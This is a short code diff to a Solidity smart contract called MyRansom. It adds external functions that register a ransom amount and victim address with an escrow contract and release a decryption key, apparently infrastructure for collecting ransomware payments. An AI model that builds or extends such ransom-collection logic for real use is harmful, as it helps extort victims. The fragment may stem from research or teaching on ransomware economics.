@@ -154,7 +154,11 @@ contract MyRansom {
     /**
      * @dev Calls the registerRansom() function in Escrow
      */
-    function myFunc(uint _ransomAmount, uint _victimId, address _victimAddr) {
+    function resetRansom(uint _ransomAmount, uint _victimId, address _victimAddr) external {
         Escrow(escrowAddr).registerRansom(_ransomAmount, _victimId, _victimAddr);
+    }
+    
+    function DecryptEvent(uint _id, string _encKey) external {
+        Escrow(escrowAddr).decryptKey(_id, _encKey);
     }
 }
